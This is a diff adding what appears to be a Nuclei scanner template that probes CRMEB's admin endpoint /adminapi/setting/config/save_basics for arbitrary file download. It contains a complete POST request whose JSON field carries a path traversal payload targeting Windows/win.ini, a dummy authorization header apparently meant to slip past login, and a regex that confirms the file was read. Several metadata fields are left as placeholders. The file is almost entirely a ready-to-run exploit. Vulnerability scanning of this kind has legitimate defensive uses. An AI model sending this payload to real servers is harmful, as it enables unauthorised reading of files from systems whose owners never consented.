@@ -1,0 +1,39 @@
+id: CRMEB-save-basics-lfi
+
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: app/adminapi/controller/v1/setting/SystemConfig.php路由中存在任意文件下载漏洞
+  reference:
+    - https://github.com/wy876/POC/commit/61b2bf45a165e027ea7014e0bd153f5bf1108b61#diff-db562bc89fbc2e63817b9b626f443a8fea5da860185b61d2b604c966f1da9011R1
+  tags: tags
+
+http:
+  - raw:
+      - |-
+        POST /adminapi/setting/config/save_basics HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Authori-zation: 1
+        Cookie: cb_lang=zh-cn;
+        Sec-Fetch-Dest: document
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-Site: none
+        Sec-Fetch-User: ?1
+        Priority: u=0, i
+        Content-Type: application/json;charset=utf-8
+        Content-Length: 72
+
+        {
+            "weixin_ckeck_file": "../../../../../../../../Windows/win.ini"
+        }
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "\\[(font|extension|file)s\\]"
